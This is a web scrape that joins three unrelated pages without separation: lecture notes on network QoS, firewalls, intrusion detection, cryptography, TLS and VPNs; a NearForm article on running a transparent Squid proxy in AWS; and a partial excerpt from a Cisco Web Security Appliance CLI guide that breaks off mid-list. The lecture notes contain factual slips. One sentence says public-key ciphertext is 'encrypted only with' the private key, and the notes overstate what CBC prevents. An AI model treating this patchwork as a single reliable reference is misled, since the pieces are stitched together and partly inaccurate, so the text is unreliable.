several approaches were taken to attempt to provide better controls
for scheduling the delivery of IP packets.Quality of service (QoS) on a network is characterized by four factors:Quality of service problems arise because we do not have unlimited resources.Quality of service on a network is achieved via resource allocation and packet prioritization
Network service quality can be strictly enforced or may be attempted via a best-effort approach.
Hard QoS refers to a system that is designed to provide a guaranteed level of
service via reservations while soft QoS refers to a system that uses a best-effort approach
to try to deliver, but not guarantee, the desired level of service.Two broad approaches to providing data channels with managed quality of service on a
network are admission control and traffic control.
Admission control is generally designed to enforce hard QoS.
With admission control, we ask that applications first request a particular quality of
service from the network. The network (i.e., all the routers in the path from the source
to the destination) will reserve resources for switching and routing the packets to
conform to that grade of service and grant the request to the application. If any router cannot
commit to the needed resources, the request will be denied. Traffic control provides soft QoS.
Soft QoS on a network refers to prioritization of packets
without any reservation of resources from routers or endpoints or
any a priori negotiation for a level of service.
With traffic control, applications may send data onto the network freely
but the network elements (routers) will classify, queue, schedule, and sometimes drop
packets based on various criteria.A link scheduling discipline defines how packets are scheduled at the output queue.
When we looked at router architecture, we considered only
a single queue per output
interface with packets transmitted in a first-in-first-out (FIFO) manner.
This is the simplest approach but does not offer any opportunity for differentiating
one datagram from another based on its service class.A router can set up multiple queues for an output link and place different
classes
(e.g., based on addresses, ports, or other fields in the IP header)
of packets onto different queues. A packet scheduler then picks
the next packet from a specific queue for transmission. A round-robin
scheduler will give each class of packet (queue) equal priority.
A priority scheduler will always service high-priority queues first but can lead to
starvation of low-priority queues: low-priority queues might never get serviced.
A desirable characteristic of queue management is traffic isolation - to ensure
that one class of service cannot adversely affect another class even if it has a higher
A weighted fair queuing (WFQ) approach gives each queue a priority level but also a
ensures a certain minimum percentage of the available link bandwidth so that
starvation does not occur.Traffic shaping is when a router queues packets in certain flows during
peak usage for later retransmission when there is available bandwidth. With
traffic policing, traffic that exceeds the allocated bandwidth for
a particular flow is discarded.A leaky bucket is a traffic shaping algorithm that coverts a bursty flow into
a constant bitrate flow: it removes jitter. The bucket is represented by a queue that
receives data at an irregular rate (in bursts).
The queue is emptied at a constant rate (the hole at the bottom of the bucket),
resulting in an absence of jitter.
If there is nothing left to read in the queue, we have a buffer underrun and jitter occurs.
If the queue is already full when data arrives, we have a buffer overrun and packet loss occurs.A token bucket is a “bucket” that holds tokens that are generated at
a constant rate. In order to transmit a packet, the bucket must be drained of
the number of tokens that is proportionate to the packet’s size. The token bucket algorithm
does not smooth out traffic like the leaky bucket does but ensures that an average bitrate
is enforced for a specific flow. For example, a buildup of tokens can result in
a burst of data.Differentiated services (DiffServ) is a way for programmers to provide advisory information inside
an IP header on how a packet should be processed by routers. A packet can be
assigned a specific service code by setting a value in the 6-bit Differentiated Services Codepoint (DSCP)
field of the IP header.
DiffServ is an example of traffic classification.
It is entirely up to the routers to decide how to process this
information (e.g., via WFQ), what the service levels mean,
or even whether to process it at all. Differentiated services are an example
of soft QoS: there is no guarantee on the actual quality of service
that will be delivered. A common use for DiffServ is to try to provide a better quality
of service for voice over IP (VoIP) phone calls by tagging those packets for
Expedited Forwarding (EF) service, which
is defined to have the characteristics of low delay, low loss, and low jitter.
Whether DiffServ values are used at all and how they are interpreted is
strictly up to the ISP.Integrated Services (IntServ) is
an approach that relies on end-to-end reservation of services.
A transmitting host specifies its traffic (as a token bucket with a given rate and size)
and requested level of service guarantee.
Integrated Services system relies on
the Reservation protocol, RSVP, which has been
developed to allow a flow of packets to be routed with bitrate
guarantees. RSVP is an example of a soft state protocol, meaning that
state is not maintained perpetually but reservations expire unless they
are refreshed periodically.The problem with guaranteeing this is that all routers in the path
from the source to the destination must be configured to support RSVP: each
intermediate router must commit to reserving the needed amount of routing
resources to guarantee the desired level of service. Integrated Services is an example of
admission control while differentiated services is an example of traffic control.
If one ISP in the path does not support this then all bets are off.The Real-Time Protocol (RTP) is an application-level protocol on top
of UDP. It does not define any mechanisms for data delivery or QoS control. As with
any UDP datagrams, neither in-order delivery nor delivery in general is assured.
What RTP does is allow a sender to attach timestamps to packets so that a
receiver can play them back at the same rate at which they were sent. An RTP header contains:
- payload type: identifies type of video or audio encoding. An application can change the encoding type mid-stream (e.g., to switch to a lower bandwidth codec, for example)
- sequence number: app can detect missing packets & conceal data loss
- timestamp: app can play back data at appropriate intervals
- source ID of stream: uniquely identifies stream to allow demultiplexing multiple streams that may received at the same port.RTP is widely used for voice and video, particularly for media transport in SIP (Session Initiation Protocol) systems.The RTP Control Protocol (RTCP) is a companion protocol to RTP and is used to provide feedback
from the receiver to the sender. By comparing the arrival time between packets with the difference in timestamps in
the RTP header, a receiver can compute jitter. By checking sequence numbers, a receiver can compute packet loss.
The receiver can periodically send this feedback through RTCP so that the sender can make adjustments
to the data stream (for example, change to a lower bandwidth codec).A firewall protects the junction between an untrusted
network (e.g., external Internet) and a trusted network (e.g., internal network).
Two approaches
to firewalling are packet filtering and proxies.
A packet filter, or screening router,
determines not only the route of a packet but whether the packet
should be dropped based on contents in the IP header, TCP/UDP header,
and the interface on which the packet arrived. It is usually implemented
inside a border router, also known as the gateway router that
manages the flow of traffic between the ISP and internal network.The packet filter evaluates a set of rules to determine whether to drop
or accept a packet. This set of rules forms an access control list,
often called a chain. Strong security follows a default deny model,
where packets are dropped unless some rule in the chain specifically permits them.
With stateless
inspection, a packet is examined on its own with no context based
on previously-seen packets.
Stateful inspection allows the router to keep track of TCP connections
and understand the relationship between packets. For example, a port that
needs to be enabled for the FTP data channel once an FTP connection
has been established or that return packets should be allowed into the
network in response to outbound requests.Packet filters traditionally do no look above the transport layer.
Deep packet inspection
(DPI) allows a firewall to examine application data
as well and make decisions based on its contents. Deep packet inspection
can validate the protocol of an application as well as check for malicious
content such as malformed URLs or other security attacks.An application proxy is software that presents the same protocol to
the outside network as the application for which it is a proxy.
For example, a mail server proxy will listen on port 25 and understand
SMTP, the Simple Mail Transfer Protocol. The primary job of the proxy is
to validate the application protocol and thus guard against protocol
attacks (extra commands, bad arguments) that may exploit bugs in the service. Valid requests are then regenerated
by the proxy to the real application that is running on another server and is
not accessible from the outside network.
The proxy is the only one that can communicate with the internal network.
Unlike DPI, a proxy may modify the data stream,
such as stripping headers or modifying machine names. It may also restructure
the commands in the protocol used to communicate with the actual servers (that is,
it does not have to relay everything that it receives).A typical firewalled environment is a screened subnet
architecture, with a separate subnet for systems that run externally-accessible
services (such as web servers and mail servers) and another one for internal
systems that do not offer services and should not be accessed from the outside.
The subnet that contains externally-accessible services is called the DMZ (demilitarized zone).
The DMZ contains all the hosts that may be
offering services to the external network (usually the Internet).
Machines on the internal network are not accessible from the Internet.
All machines within an organization will be either in the DMZ or
in the internal network.Both subnets will be protected by screening routers.
They will ensure that no packet
from the outside network is permitted into the inside network.
Logically, we can
view our setup as containing two screening routers:The exterior router allows IP packets
 only to the machines/ports in the DMZ that are offering valid
 services. It would also reject any packets that are masqueraded to
 appear to come from the internal network.The interior router
 allows packets to only come from designated machines in the DMZ that
 need to access services in the internal network. Any packets
 not targeting the appropriate services in the internal network will
 be rejected. Both routers will generally allow traffic to flow from
 the internal network to the Internet, although an organization may
 block certain services (ports) or force users to use a proxy (for
 web access, for example).Note that the two screening routers may be easily replaced with
a single router since filtering rules can specify interfaces. Each rule can thus
state whether an interface is the DMZ, internal network,
or Internet (ISP).A variation on screening routers is the use of intrusion detection systems (IDS).
A screening router simply makes decisions based on packet headers. Intrusion
detection systems try to identify malicious behavior. There are three forms of IDS:A protocol-based IDS validates specific network protocols for
conformance. For example, it can implement a state machine to ensure that messages
are sent in the proper sequence, that only valid commands are sent, and that replies match
requests.A signature-based IDS is similar to a PC-based virus checker. It
scans the bits of application data in incoming packets to try to discern if there
is evidence of “bad data”, which may include malformed URLs, extra-long strings
that may trigger buffer overflows, or bit patterns that match known viruses.An anomaly-based IDS looks for statistical aberrations in network activity.
Instead of having predefined patterns, normal behavior is first measured and used
as a baseline. An unexpected use of certain protocols, ports, or even amount of
data sent to a specific service may trigger a warning.Cryptography deals with encrypting plaintext using
a cipher, also known as an encryption algorithm,
to create ciphertext, which is unintelligible to anyone
unless they can decrypt the message.A symmetric encryption algorithm uses the same secret key
for encryption and decryption.A public key algorithm uses a pair of keys: data encrypted with
the first key can be decrypted only with the second key and vice versa.
One of these keys is kept private (known only to the creator) and is known as
the private key. The corresponding key is generally made
visible to others and is known as the public key. Anything
encrypted with the private key can only be decrypted with the public
key. This is the basis for digital signatures
because the encryption can only be performed by the key’s owner.
Anything that is
encrypted with a public key can be encrypted only with the corresponding
private key. This is the basis for authentication and covert
communication because decryption can only be performed by the owner, who
is the only one who has the private key.When data is transmitted, it is broken into blocks and each block is encrypted
separately. This leads to two problems. If different communication sessions
contain the same messages and use the same key, an intruder can see that the
same data is being sent. Secondly, a malicious party can add or delete, add, or replace
blocks (perhaps with random junk or perhaps with blocks that were captured
from previous communication sessions). Cipher block chaining (CBC) addresses
these problems. Every block of data is still encrypted with the same key. However,
prior to being encrypted, the data block is exclusive-ored with the previous
encrypted block. The receiver does the process in reverse: a block of received
data is decrypted and then exclusive-ored with the previously-received block to
obtain the original data. The very first block is exclusive-ored with a random
initialization vector, which must be transmitted to the remote side. Note
that CBC does not make the encryption more secure; it simply makes the result of
each block of data dependent on the previous block so that data cannot be inserted or deleted in
the message stream.A cryptographic hash function is a one-way function
whose output is always a fixed number of bits for
any input. By one-way, we mean that there is no way to compute
the input when given the output.
For good cryptographic hash functions
(e.g., SHA–1, SHA–2, SHA–3),
it is highly unlikely that two messages will ever
hash to the same value, it is extremely difficult to construct
text that hashes to a specific value, and it is extremely difficult
to modify the plaintext without changing its resultant hash.
The hash function is the basis for message authentication
codes and digital signatures. Note that when we talk about
cryptography and mention phrases such as “extremely difficult”,
we mean “impossible for all practical purposes,” not that
“you can do it if you spend an entire week working on the problem.”To communicate securely using a symmetric cipher, both parties need
to have a shared secret key. Alice will encode a message to Bob
using the key and Bob will use the same key to decode the message. If
Alice wants to communicate with Charles, she and Charles will also
need a secret key. The fact that every pair of entities will need
a secret key leads to a phenomenon known as key explosion.
Overall, in a system with n users, there will be
O(n2) keys.The biggest problem with symmetric cryptography is dealing with key
distribution: how can Alice and Bob establish a key so they can
communicate securely? The Diffie-Hellman key
exchange algorithm allows one to do this. Each party will
generate a private key and a public key (these are not
encryption keys; they are just numbers — Diffie-Hellman does
not implement public key cryptography — it is unfortunate
that the term was used to describe these numbers). Alice can use
her private key and Bob’s public key to compute a
common key.
Bob can compute the same common key by using his private key and Alice’s public key.
They can then communicate securely by using the common key with a symmetric cipher.Using true public key cryptography, such as RSA, if Alice encrypts a
message with Bob’s public key, Bob will be the only one who can
decrypt it since doing so will require Bob’s private key. Likewise,
Bob can encrypt messages with Alice’s public key, knowing that only
Alice will be able to decrypt them with her private key.A session key is a random key that is generated for encrypting data for
one communication session. It is useful because if the key
is ever compromised, no lasting information is obtained: future
communication sessions will use different keys. A hybrid
cryptosystem uses public key cryptography to send a session key
securely. The originator generates a random session key and encrypts
it with the recipient’s public key. The recipient decrypts the
message with the corresponding private key to extract the session
key. After that, symmetric cryptography is used for communication,
with messages encrypted with the session key. This has the advantages
of higher performance (public key cryptography is much, much slower than
symmetric cryptography), ease of communicating with multiple parties
(just encrypt the session key with the public keys of each of the
recipients), and allows the bulk of data to be encrypted with
session keys instead of the hardly-ever-changing
public keys.Message Authentication Code (MAC) is a cryptographic hash of a message that
is encrypted with a shared symmetric key. This MAC is sent along with the message.
If an intruder modifies the message, the receiver will be able to validate that
the message no longer matches the MAC: simply hash the message and compare it with
the value of the decrypted MAC. An intruder cannot generate a new MAC because
you need the secret key to do so.A digital signature is similar to a MAC but uses public key cryptography.
It is simply the hash of a message encrypted with the creator’s private key.
Anyone who has the message signer’s public key can decrypt the hash and thus validate
it against the message. Other parties, however, cannot recreate the signature.
Even though they can generate the same hash for the message, they do not have the
signer’s private key to encrypt that hash.As we saw with hybrid cryptosystems, public key cryptography makes key exchange
simple. It also simplifies authentication. If Alice wants to authenticate herself
to Bob (prove that she’s really Alice), Bob will generate a random bunch of bits,
called a nonce, and ask Alice to encrypt the nonce with her private key
(something only she can do). She will send the result back to Bob who will decrypt
the data with Alice’s public key. If the result matches Bob’s original nonce, he
is convinced that Alice has Alice’s private key and therefore is really Alice.For Bob to validate Alice in the above example, Bob must be confident that he
really has Alice’s public key rather than someone else’s.
X.509 digital certificates provide a way to do associate an identity
with a public key and have some entity vouch for that association.
A certificate
is a data structure that contains user information and the user’s
public key. This data structure also contains a signature
of the certification authority (CA).
The signature is created by taking a hash of the rest of the data in the structure
and encrypting it with the private key of the CA.
The CA is responsible for setting policies of how
they validate the
identity of the person who presents the public key for encapsulation
in a certificate.Secure Sockets Layer
(SSL, also known as TLS — Transport Layer
Security) is a layer of software above TCP at the application layer
designed to provide authentication
and secure communication while giving the programmer the feel of
a normal sockets interface.
It makes it easy to add a secure transport onto insecure TCP socket-based
protocols (e.g., HTTP and FTP). SSL uses a hybrid cryptosystem and
relies on public keys for authentication. If both the sender and
receiver have X.509 digital certificates, SSL can validate them and
use nonce-based public key authentication to validate that each party has the
corresponding private key. In some cases, it may validate the server
only. If the server does not have a certificate, SSL will then use
a public key simply to allow a symmetric session key to be passed
securely from client to server.
The client generates a session key and encrypts it with the server’s public key.
This ensures that only the server will be able to decode the message and
get the session key.
After that, communication takes
place using a symmetric algorithm and the client-generated session
key. Each encrypted message that is sent contains a MAC (message authentication code)
to allow the receiver to ensure that the message has not bee accidentally
or maliciously modified.Virtual private networks (VPNs)
allow disconnected local area networks to communicate
securely over the public Internet, saving money by using a shared public network (Internet)
instead of leased lines. This is achieved by tunneling, the
encapsulation of an IP datagram within another datagram.
In this case, a
datagram that is destined for a remote subnet, which will often have local
source and destination IP addresses that may not be routable over the
public Internet, will be treated as payload and be placed inside a datagram
that is routed over the public Internet. The source and destination
addresses of this outer datagram are the VPN endpoints at both sides, usually the VPN-aware routers.When the VPN endpoint (router) receives this encapsulated datagram, it extracts the
data, which is a full IP datagram, and routes it on the local area network.
This tunneling behavior gives us the virtual network part of the
VPN.To achieve security (the “private” part of VPN), an administrator setting up a VPN will
usually be concerned that the data contents are not readable and
the data has not been modified.
To ensure this, the encapsulated packets can be encrypted and signed. Signing
a packet enables the receiver to validate that the
data has not been modified in transit. Encrypting ensures
that intruders would not be able to make sense of the data, which is the
encapsulated datagram.VPNs usually provide several options for key management: shared
private keys (AES or 3DES), Diffie-Hellman key exchange, or RSA public keys.
IPsec is one of the most popular types of VPNs and has two variations.
Authentication Header (AH) mode adds a signature to the encapsulated datagram
but does not encrypt any data. Data is readable but cannot be modified.
Authentication Header mode is rarely used since the overhead of encrypting
data is quite low. The other variant is the Encapsulating Security Payload (ESP)
mode, which adds a signature as with AH but also encrypts the entire datagram.In an environment where an individual computer outside a trusted network
needs to connect to another node securely, tunneling will not work since there
is no gateway router that will extract an embedded datagram and no trusted local area network
on which to route it.
To support this environment, VPNs can operate in transport mode instead
of tunnel mode. No tunneling takes place and hence there is no encapsulation of the full IP
datagram. The IP payload (which will include TCP or UDP headers) is encrypted and signed but the original
IP header is left unchanged.  © 2003-2016 Paul Krzyzanowski. All rights reserved.For questions or comments about this site, contact Paul Krzyzanowski, 
gro.kp@ofnibew

The entire contents of this site are protected by copyright under national and international law.
No part of this site may be copied, reproduced, stored in a retrieval system, or transmitted, in any form,
or by any means whether electronic, mechanical or otherwise without the prior written
consent of the copyright holder.
If there is something on this page that you want to use, please let me know.

Any opinions expressed on this page do not necessarily reflect the opinions of my employers and may not
even reflect my own.
 Last updated: May  6, 2016

NearFormIn this article I’m going to be setting up an example network and deploying a transparent proxy to it. To make this repeatable and to show exactly how it can be deployed in AWS VPC, I am using Terraform. Terraform is an excellent tool for describing and automating cloud infrastructure. All of the terraform code in this project can be found here: https://github.com/nearform/aws-proxy-patternI have chosen to use AWS for this article and the associated terraform code, but the concept is very general and terraform code could be written for any supported IaaS platform (e.g. Google Cloud, Azure, etc.)Let me start by defining some terms and explaining what a proxy is good for.A transparent proxy is one where there is no configuration required on the applications using the proxy. The hosts may have some routing configuration to make it work, but applications are unaware. This is in contrast to an explicit proxy, where applications are made aware and direct their traffic to the proxy’s IP address e.g. via a browser PAC (proxy autoconfiguration) file. In large deployments, systems like Windows Group Policy and WPAD (PAC file discovery via DHCP or DNS) are used to configure a large number of hosts automatically.Using a proxy can provide a degree of control over outbound web traffic. For example, the proxy can monitor and keep audit logs of that traffic, or intervene and block traffic that is likely to pose a threat to the network. There is also a very significant non-security related benefit in the form of caching, where repeated downloads of the same content can be served from the proxy instead. However by intentionally making a proxy the sole means of internet access, a bottleneck and single point of failure is introduced, so typically some kind of high availability setup would be used, such as a load balancer and proxy group.Historically, web proxies have been most useful to system administrators in corporate networks, but even a network hosting something like a SaaS product in a microservices architecture can benefit. One of the first things a piece of malware will do (perhaps after attaining persistence on a host) will be to contact command and control infrastructure over the internet. A proxy can make you aware of this, block the attempt and give you a chance to identify the affected machine.I chose Squid for the proxy software. Squid is a caching web proxy and is a very popular and mature project. It has been around for more than 20 years and is easy to install and configure.The diagram above shows the key components – a private subnet with an example host that will be trying to make requests to the internet. The proxy receives traffic via a network default route, logging requests and filtering based on domain name. A management host is used just to provide a means to SSH to the example host, which only has a private IP address. Management networks are a topic for another article – but this simulates something which would normally happen over a VPN, if at all.There is a private subnet with a default route to the proxy’s network interface. This means all internet-bound traffic will arrive at the proxy server first.Disabling source and destination checks on the proxy instance is also necessary to allow it to receive traffic not destined for the instance’s own IP address:Finally there are some iptables rules on the proxy instance which redirects the packets into the squid server (which is listening on ports 3129 for HTTP and 3130 for HTTPS). From there, the fact that the proxy instance has a public IP address and the default route for the public subnet is the VPC’s internet gateway is sufficient to send the traffic out to the internet:There were many ways I could have provisioned the EC2 instance used for the proxy. In this excellent article on the AWS security blog, the proxy was built from source on the running instance. Many package managers like apt or yum have a squid package available, though you often don’t get to run the latest version or with particular compiled-in features.There are Chef and Puppet modules for squid to follow a more ‘declarative’ paradigm, where I specify the machine configuration I need and let the provisioning layer translate that into ‘imperative’ commands to achieve the goal. And whichever provisioning method is used, a machine imaging solution like Packer could be used to build an AWS AMI ahead of time. This could be particularly useful to get an instance serving traffic quickly after boot, which is very useful in a load balanced proxy group setup.In my case, I opted to use my own docker image, based on Alpine Linux and using the apk package manager to install squid. This produced an image around 15mb in size, and along with terraform, contributed to making this repeatable for others. Just pulling a docker image and running it is a lot easier and repeatable in a variety of environments compared to the alternatives. It also allowed me to try out some interesting solutions that nearForm are working on for vulnerability scanning of docker images, and it was good to see that the low attack surface of Alpine fed through to a clean bill of health on my image (at least for now).The server still needed some provisioning to get to the point where it can run the squid container, and I used AWS user data scripts for this, which installs Docker, creates the squid configuration file, sets up an x509 certificate that squid needs for SSL inspection, runs the squid container and creates the aforementioned iptables rules.Which runs this script on instance boot.The squid configuration looks like this:Most of the configuration is straightforward and sets up ports and domain whitelists. The interesting part is the ssl_bump directives. Intercepting HTTPS traffic is basically a form of Man-in-the-Middle attack so to avoid certificate warnings and client rejections, a proxy that wants to decrypt HTTPS traffic usually works by having clients install a root certificate (owned by the proxy) in advance, and issuing new certificates signed by this root for HTTPS domains on the fly. This is a complex topic and is a bit of a security ‘can of worms’ which you can read more about here.For this article, I’m doing something less controversial and just doing domain name filtering during the TLS handshake rather than decrypting traffic. This is where the ssl_bump directives come in:By asking Squid to peek, peek and splice respectively, I’m instructing it to open an onward TCP connection, forward the ClientHello and make a note of the SNI domain (if any), extract the domain from the ServerHello and then make a decision. Either it will splice the rest of the connection (pass through without decryption), or it will terminate the connection based on domain name.Squid did a great job of explaining this peek and splice method in their online documentation.So that was plenty of theory! Let’s see if it actually works.I bring up the infrastructure using terraform plan and terraform apply, ensuring that I have AWS credentials set up at ~/.aws/credentials with a profile called default. Once the infrastructure is created, I should see some IP addresses in the output:Then I open an SSH connection through the management host to the example host, ensuring that I avoid the common pitfalls:If you have done all that, you should be able to get through to the example host:In a separate window, you can SSH to the proxy instance to monitor the logs:The sha512.badssl.com domain is one of the test endpoints on the BadSSL service which offers up a valid SSL connection – the proxy is allowing through connections on both HTTP and HTTPS for domains in the whitelist. The proxy should have logged these requests in the other window:Requests to a non-whitelisted domain are prevented, as is a connection to a whitelisted domain where the certificate has expired. The access.log and cache.log record this:Don’t forget to terraform destroy at the end so you don’t rack up the costs in your AWS account for EC2 servers you don’t need!PagesTwitterSome ridiculous number of @nodejs Code & Learn PRs were run through CI and landed by @BridgeAR in the last 24 hours or so. Fantastic work!Looking forward to giving a talk about best practices for error handling in @nodejs at the @nodejsdublin meetup next week.  https://t.co/qs03rCzVexBlogEventsSocial© 2018 NEARFORM LTD. ALL RIGHTS RESERVED. TANKFIELD, CONVENT HILL, TRAMORE, CO. WATERFORD, X91 PV08, IRELAND. Privacy policy.
Have an account?Need an account?User Guide for AsyncOS 11.0 for Cisco Web Security Appliances Command Line
	 InterfaceView with Adobe Reader on a variety of devicesThis
                        		  appendix contains the following sections: 
                        		
                     
                           The AsyncOS Command Line Interface (CLI) allows you to configure and monitor the Web Security appliance. The Command Line
                           Interface is accessible using SSH on IP interfaces that have been configured with these services enabled, or using terminal
                           emulation software on the serial port. By default, SSH is configured on the Management port. 
                        
                           The commands are invoked by entering the command name with or without any arguments. If you enter a command without arguments,
                           the command prompts you for the required information.
                        
                           You can connect using one of the following methods:
                         You can add other
                              		users with differing levels of permissions after you have accessed the CLI the
                              		first time using the 
                              		admin account—log in to the appliance by entering
                              		the default 
                              		admin user name and passphrase: 
                              	 
                            The System Setup
                              		Wizard prompts you to change the passphrase for the 
                              		admin account the first time you log in with the
                              		default passphrase. 
                              	 
                            You can also reset
                              		the 
                              		admin account passphrase at any time using the 
                              		passwd command. 
                              	 
                            You can connect and
                              		log into the appliance at any time, using a valid user name and passphrase.
                              		Note that a listing of recent appliance access attempts, both successes and
                              		failures, for the current user name is displayed automatically upon log-in. 
                              	 
                            See the following 
                              		userconfig command description, or 
                              		Administering User Accounts
                              		for information about configuring additional users. 
                              	 
                            The top-level command
                              		prompt consists of the fully qualified hostname, followed by the greater than (
                              		
                              		> ) symbol, followed by a space. For example:
                              	 
                            When running
                              		commands, the CLI requires input from you. When the CLI is expecting input, the
                              		prompt displays the default values enclosed in square brackets ( 
                              		[] ) followed by the greater than ( 
                              		> ) symbol. When there is no default value, the
                              		brackets are empty. 
                              	 
                            For example:
                              	 
                            When there is a
                              		default setting, the setting is displayed within the command-prompt brackets.
                              		For example:
                              	 
                            When a default
                              		setting is shown, typing Return is equivalent to accepting the default.
                              	 
                           
                              When operating in the interactive mode, the CLI command syntax consists of single commands with no white space and no arguments
                              or parameters. For example:
                           
                              When you are presented with multiple choices for input, some commands use numbered lists. Enter the number of the selection
                              at the prompt.
                           
                              For example:
                           
                              When given a yes or no option, the question is posed with a default in brackets. You may answer Y, N, Yes, or No. Case is not significant. 
                           
                              For example:
                            Some commands give
                              		you the opportunity to use subcommand directives such as 
                              		NEW, EDIT, and
                                 		  DELETE. The 
                              		EDIT
                              		and 
                              		DELETE
                              		functions provide a list of previously configured values. 
                              	 
                            For example: 
                              	 
                            Within subcommands,
                              		pressing Enter or Return at an empty prompt returns you to the main command. 
                              	 
                           
                                 You can use the Ctrl+C keyboard shortcut at any time within a subcommand to immediately exit return to the top level of the
                                 CLI.
                              
                              The CLI keeps a history of all commands entered during a session. Use the Up and Down arrow keys on your keyboard, or the
                              Ctrl+P and Ctrl+N key combinations to scroll through a running list of the recently-used commands.
                            The AsyncOS CLI
                              		supports command completion. You can enter the first few letters of some
                              		commands followed by the Tab key and the CLI completes the string. If the
                              		letters you entered are not unique among commands, the CLI “narrows” the set.
                              		For example:
                              	 
                           
                           This section describes some basic commands you might use in a typical CLI session, such as committing and clearing changes.
                           
                         Entering comments
                                 		  after the commit command is optional. 
                                 		
                               The clear command
                                 		  clears any changes made to the appliance configuration since the last commit or
                                 		  clear command was issued. 
                                 		
                               The exit command
                                 		  logs you out of the CLI application. Configuration changes that have not been
                                 		  committed are cleared. 
                                 		
                               The 
                                 		  help command lists all available CLI commands and
                                 		  gives a brief description of each command. The 
                                 		  help command can be invoked by typing either help or a
                                 		  single question mark ( ? ) at the command prompt. 
                                 		
                               Further, you can
                                 		  access help for a specific command by entering 
                                 		  help commandname. 
                                 		
                               The Web Security Appliance CLI supports a set of proxy and UNIX commands to access, upgrade, and administer the system. You can configure the Web Security appliance to have stricter access requirements for administrators logging into the appliance,
                              and you can specify an inactivity time-out value. See Additional Security Settings for Accessing the Appliance and User Network Access for more information. 
                           
 Configure advanced Web Proxy options; subcommands are: AUTHENTICATION – Authentication configuration options: 
                           CACHING – Proxy Caching mode; choose one: 
                           Customized Mode 
 See also Choosing The Web Proxy Cache Mode. 
                                 DNS – DNS configuration options: 
                            Find web server by: 

0 = Always use DNS answers in order 

1 = Use client-supplied address then DNS 
 2 = Limited DNS usage 
 3 = Very limited DNS usage 
 The default value is 0. For options 1 and 2, DNS will be used if Web Reputation is enabled. For options 2 and 3, DNS will
                                    be used for explicit proxy requests, if there is no upstream proxy or in the event the configured upstream proxy fails. For
                                    all options, DNS will be used when Destination IP Addresses are used in policy membership. 
                                 EUN – End-user notification parameters: 
                           
Choose: 

1. Refresh EUN pages 

2. Use Custom EUN pages 

3. Use Standard EUN pages 

Would you like to turn on presentation of the User Acknowledgement page? 
 See also Web Proxy Usage Agreement and End-User Notifications Overview. 
                           NATIVEFTP – Native FTP configuration: 
                           Would you like to enable FTP proxy 
Enter the ports that FTP proxy listens on 
Enter the range of port numbers for the proxy to listen on for passive FTP connections 
Enter the range of port numbers for the proxy to listen on for active FTP connections 
Enter the authentication format: 
 1. Check Point 

2. No Proxy Authentication 

3. Raptor 
Would you like to enable caching 

Would you like to enable server IP spoofing 
Would you like to pass FTP server welcome message to the clients 
Enter the max path size for the ftp server directory 
 See alsoOverview of FTP Proxy Services. 
                           FTPOVERHTTP – FTP Over HTTP options: 
                           Enter the login name to be used for anonymous FTP access 

Enter the password to be used for anonymous FTP access 
 See also Overview of FTP Proxy Services. 
                           HTTPS – HTTPS-related options: 
                           
HTTPS URI Logging Style - fulluri or stripquery 
Would you like to decrypt unauthenticated transparent HTTPS requests for authentication purpose 
Would you like to decrypt HTTPS requests for End User Notification purpose 
Action to be taken when HTTPS servers ask for client certificate during handshake: 
 1. Pass through the transaction 

2. Reply with certificate unavailable 
Do you want to enable server name indication (SNI) extension? 
Do you want to enable automatic discovery and download of missing Intermediate Certificates? 
Do you want to enable session resumption? 
 See also Overview of Create Decryption Policies to Control HTTPS Traffic. 
                           SCANNING – Scanning options: 
                           
Do you want to disable Webroot body scanning 
 See also Overview of Anti-Malware Scanning and Overview of Scanning Outbound Traffic. 
                           PROXYCONN – Manage the list of user agents that cannot accept the proxy connection header. The list entries are interpreted as regular
                              expressions in Flex (Fast Lexical Analyzer) dialect. A user agent will be matched if any substring of it matches any regular
                              expression in the list. 
                           Choose the operation you want to perform: NEW - Add an entry to the list of user agents 
DELETE - Remove an entry from the list 
CUSTOMHEADERS – Manage custom request headers for specific domains. 
                            Choose the operation you want to perform:  DELETE - Delete entries 
NEW - Add new entries 
 EDIT - Edit entries 
 See also Adding Custom Headers To Web Requests. 
                           MISCELLANEOUS – Miscellaneous proxy-related parameters: 
                           
Would you like proxy to respond to health checks from L4 switches (always enabled if WSA is in L4 transparent mode) 

Would you like proxy to perform dynamic adjustment of TCP receive window size 
Would you like proxy to perform dynamic adjustment of TCP send window size 
Do you want to filter non-HTTP responses? Enable caching of HTTPS responses 
Enter minimum idle timeout for checking unresponsive upstream proxy (in seconds) 
Enter maximum idle timeout for checking unresponsive upstream proxy (in seconds) 
 Mode of the proxy: 

1. Explicit forward mode only 

2. Transparent mode with L4 Switch or no device for redirection 

3. Transparent mode with WCCP v2 Router for redirection 
Spoofing of the client IP by the proxy: 
1. Disable 
 2. Enable for all requests 

3. Enable for transparent requests only
Do you want to pass HTTP X-Forwarded-For headers? 
Do you want to enable server connection sharing? 
Would you like to permit tunneling of non-HTTP requests on HTTP ports? 
Would you like to block tunneling of non-SSL transactions on SSL Ports? 
 Would you like proxy to log values from X-Forwarded-For headers in place of incoming connection IP addresses? 
Do you want proxy to throttle content served from cache? 
Would you like the proxy to use client IP addresses from X-Forwarded-For headers 
Do you want to forward TCP RST sent by server to client? 
Do you want to enable WCCP proxy health check? 
Do you want to enable URL lower case conversion for velocity regex? 
 See also Using the P2 Data Interface for Web Proxy Data and Configuring Web Proxy Settings. 
                           SOCKS – SOCKS Proxy options: 
                           Would you like to enable SOCKS proxy 
Proxy Negotiation Timeout 
UDP Tunnel Timeout 

SOCKS Control Ports 

UDP Request Ports 
 See also Using the P2 Data Interface for Web Proxy Data
and SOCKS Proxy Services. 
                           CONTENT-ENCODING – Allow and block content-encoding types. 
                            Currently allowed content-encoding type(s): compress, deflate, gzip  Currently blocked content-encoding type(s): N/A  To change the setting for a specific content-encoding type, select an option:  1. compress  2. deflate  3. gzip  [1]>  The encoding type "compress" is currently allowed  Do you want to block it? [N]>  You can configure the Web Security appliance to have stricter access requirements for administrators logging into the appliance.
                              
                            Specify alert recipients, and set parameters for sending system alerts.  Allows you to delete one or all entries (users) from the authentication cache. You can also list all users currently included
                              in the authentication cache. 
                            Enable bandwidth control debug messages in the Default Proxy log file. certconfig

SETUP – Configure security certificates and keys. 
                           OCSPVALIDATION – Enable/disable OCSP validation of certificate during upload. 
                            Clears pending configuration changes since last commit.  Commits pending changes to the system configuration.  Creates a computer object at the location you specify. Send a cURL request directly to a Web server, or to a Web server via proxy, with the request and response HTTP headers returned
                              to let you determine why a Web page is failing to load. 
                           Subcommands are: DIRECT – URL access going direct 
                                 APPLIANCE – URL access through the Appliance 
